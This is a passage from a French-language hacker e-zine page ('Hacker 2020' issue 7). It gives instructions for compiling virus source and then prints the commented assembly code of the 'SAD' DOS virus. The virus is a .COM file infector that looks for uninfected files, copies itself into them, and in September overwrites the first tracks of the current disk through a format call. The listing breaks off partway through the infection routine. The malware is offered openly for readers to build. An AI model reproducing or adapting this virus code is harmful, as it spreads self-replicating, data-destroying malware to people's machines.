<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="Author" content="Clad Strife">
   <meta name="GENERATOR" content="Mozilla/4.61 [en] (Win98; I) [Netscape]">
   <title>Hacker 2020 issue N&deg; 7</title>
</head>
<body>
<img SRC="ra.gif" height=48 width=48>
<center><font size=+4>HACKER 2020</font>
<br><u><font size=+2>issue #7, par Clad Strife</font></u></center>

<p><u>Introduction:</u> Qu'est-ce que nous avons de bon au sommaire de
ce num&eacute;ro... De la doc sur les virii, de la doc sur les serveurs,
pis un article sur Hunt, un sujet pas mal int&eacute;ressant sur caramail,
et on va parler de certains organismes gouvernementaux (le gouvernement,
encore et toujours, omnipr&eacute;sent...), mais pas mal de r&eacute;capitulation
de ce qu'il y a a savoir sur les sniffers. Je vous rappelle l'adresse officiel
du site: http://www.multimania.com/hackworldclan tant que &ccedil;a reste
visitable (Multimania n'a pas l'aire d'appr&eacute;cier ce site).
<p><u>Sommaire:</u>
<ol>
<li>
Virus / partie 1</li>

<li>
Hunt / partie 1</li>

<li>
Interview / partie 2</li>

<li>
Hacker un compte Multimania (ou autres) / partie 2</li>

<li>
PGP / partie 2</li>

<li>
Attaques NT / partie2</li>

<li>
Caramail / partie 2 (par ACiD BuRN)</li>
</ol>
Bizarre, je n'aurais jamais fait un Hacker 2020 avec quelqu'un dautre.
Si &ccedil;a plait on pourra remettre &ccedil;a.
<center>
<p><font size=+3>Chapitre 1: Virus</font></center>

<p>J'ai dress&eacute; une liste de quelques virus dont il est important
de connaitre les fonctionnalit&eacute;s. Je donnerais aussi des codes sources
de virus en assembleur. Bah et si on commen&ccedil;ait par les codes sources,
pour &ecirc;tre sur de bien pouvoir les compiler: transposez les en txt
avec Bloc-Notes en copiant collant, et renommez le .txt en .asm puis compilez:
<p><font color="#FF0000">SAD virus:</font>
<p><font color="#FF0000">;</font>
<br><font color="#FF0000">; ---- Data Segment Values ----</font>
<br><font color="#FF0000">; ds:[0f6h] = read buffer location</font>
<br><font color="#FF0000">; ds:[0f8h] = write buffer location</font>
<br><font color="#FF0000">; ds:[0fah] = store length of virus at this location</font>
<br><font color="#FF0000">; ds:[0fch] = store length of file to be infected
at this location</font>
<br><font color="#FF0000">; ds:[0feh] = filename of file to infect</font>
<br><font color="#FF0000">;</font>
<p><font color="#FF0000">.model tiny</font>
<br><font color="#FF0000">.code</font>
<br><font color="#FF0000">org&nbsp;&nbsp;&nbsp;&nbsp; 100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; origin for .com files</font>
<br><font color="#FF0000">start:</font>
<p><font color="#FF0000">&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; these two nop instructs will be used by 'Nasty'</font>
<br><font color="#FF0000">&nbsp;&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; to determine if a file is already infected</font>
<p><font color="#FF0000">&nbsp;&nbsp; ;******</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;get date</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;******</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,2ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get the date</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<br><font color="#FF0000">&nbsp;&nbsp; cmp dh,09h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; is it September?</font>
<br><font color="#FF0000">&nbsp;&nbsp; jnz do_not_activate&nbsp;&nbsp;&nbsp;&nbsp;
; if NO jmp do_not_activate</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;****</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;the nasty bit</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;****</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;*</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;* 1. Print message</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;*</font>
<br><font color="#FF0000">&nbsp;&nbsp; lea dx,mess&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; print message</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,09&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 'Nasty in September'</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;****</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;* 2. Destroy disk</font>
<br><font color="#FF0000">&nbsp;&nbsp; ;****</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,19h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get current drive (returned in al)</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov dl,al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; dl = drive # to be formated</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; disk format function</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cl,01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; first sector</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ch,00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; first track</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov dh,00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; head zero</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov al,10h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 10h (16) sectors - 2 tracks</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 13h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it (overwrite first 16 tracks on currently</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; selected disc)</font>
<br>&nbsp;
<p><font color="#FF0000">do_not_activate:</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,80h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; save parameters; set counter to 80h bytes</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov si,0080h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; offset in the current data segment of the byte</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; to be copied</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov di,0ff7fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; offset to which byte is to be moved</font>
<br><font color="#FF0000">&nbsp;&nbsp; rep movsb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; move bytes until cx=0 (decrement cx by 1 each time</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; loop is performed is done automatically)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; (increment by 1 of si &amp; di is done automatically)</font>
<p><font color="#FF0000">&nbsp;&nbsp; lea ax,begp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; load exit from program offset address into ax</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp; "&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp;
"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
"&nbsp;&nbsp; cx</font>
<br><font color="#FF0000">&nbsp;&nbsp; sub ax,100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; subtract start of .com file address (100h) from ax</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; ax now contains the length of the virus</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ds:[0fah],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; put length of the virus into the data segment at</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; offset 0fah</font>
<br><font color="#FF0000">&nbsp;&nbsp; add cx,fso&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; add fso (5h) to cx (offset address of exit)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; so, cx=cx+5</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0f8h],cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; move cx (end of virus + 5) into data segment at</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; offset 0f8h. ** Start of the write buffer.</font>
<br><font color="#FF0000">&nbsp;&nbsp; ADD CX,AX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; add virus length (ax) to cx ?????</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0f6h],cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov cx into data segment at offset 0f6h.</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; ** Start of the read buffer</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov length of virus into cx</font>
<br><font color="#FF0000">&nbsp;&nbsp; lea si,start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; load address of 'start' (start of virus) into</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; souce index</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov di,ds:[0f8h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov the value of the write buffer (@ 0f8h) into</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; destination index</font>
<br>&nbsp;
<p><font color="#FF0000">rb:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; cx = counter (length of virus)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; si = offset of byte to be read</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; di = offset of where to write byte to</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; (auto decrement of cx &amp; increment of si &amp; di)</font>
<br><font color="#FF0000">&nbsp;&nbsp; rep movsb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; copy the virus into memory</font>
<p><font color="#FF0000">&nbsp;&nbsp; stc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; set the carry flag</font>
<p><font color="#FF0000">&nbsp;&nbsp; lea dx,file_type_to_infect&nbsp;&nbsp;&nbsp;&nbsp;
; set infector for .com files only</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,4eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; find first file with specified params</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,20h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; files with archive bit set</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; if file found, CF is cleared, else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; CF is set</font>
<p><font color="#FF0000">&nbsp;&nbsp; or ax,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; works the below instructions (jz &amp; jmp)</font>
<br><font color="#FF0000">&nbsp;&nbsp; jz file_found&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; if file found jmp file_found</font>
<br><font color="#FF0000">&nbsp;&nbsp; jmp done&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; if no file found, jmp done (exit virus)</font>
<p><font color="#FF0000">file_found:</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,2fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get dta (returned in es:bx)</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ax,es:[bx+1ah]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov size of file to be infected into ax</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0fch],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov filesize into ds:[0fch]</font>
<br><font color="#FF0000">&nbsp;&nbsp; add bx,1eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; bx now points to asciz filename</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0feh],bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov filename into ds:[0feh]</font>
<br><font color="#FF0000">&nbsp;&nbsp; clc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; clear carry flag</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ax,3d02h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; open file for r/w (ds:dx -> asciz filename)</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov dx,bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov filename into dx</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it (ax contains file handle)</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov bx,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov file handle into bx</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ax,5700h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get time &amp; date attribs from file to infect</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it (file handle in bx)</font>
<br><font color="#FF0000">&nbsp;&nbsp; push cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; save time to the stack</font>
<br><font color="#FF0000">&nbsp;&nbsp; push dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; save date to the stack</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ah,3fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; read from file to be infected</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,ds:[0fch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; number of bytes to be read (filesize of file to</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; be infected</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov dx,ds:[0f6h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; buffer (where to read bytes to)</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov bx,dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov buffer location to bx</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ax,[bx]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov contents of bx (first two bytes - as bx is</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; 16-bits) into ax.</font>
<p><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Now check to see if file is infected... if the</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp;&nbsp; file is infected, it's first two bytes will be</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp;&nbsp; 9090h (nop nop)</font>
<p><font color="#FF0000">&nbsp;&nbsp; sub ax,9090h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; If file is already infected, zero flag will be set</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; thus jump to fin(ish)</font>
<br><font color="#FF0000">&nbsp;&nbsp; jz fin</font>
<br>&nbsp;
<p><font color="#FF0000">&nbsp;&nbsp; mov ax,ds:[0fch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov filesize of file to be infected into ax</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov bx,ds:[0f6h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov where-to-read-to buffer into bx</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov [bx-2],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; correct old len</font>
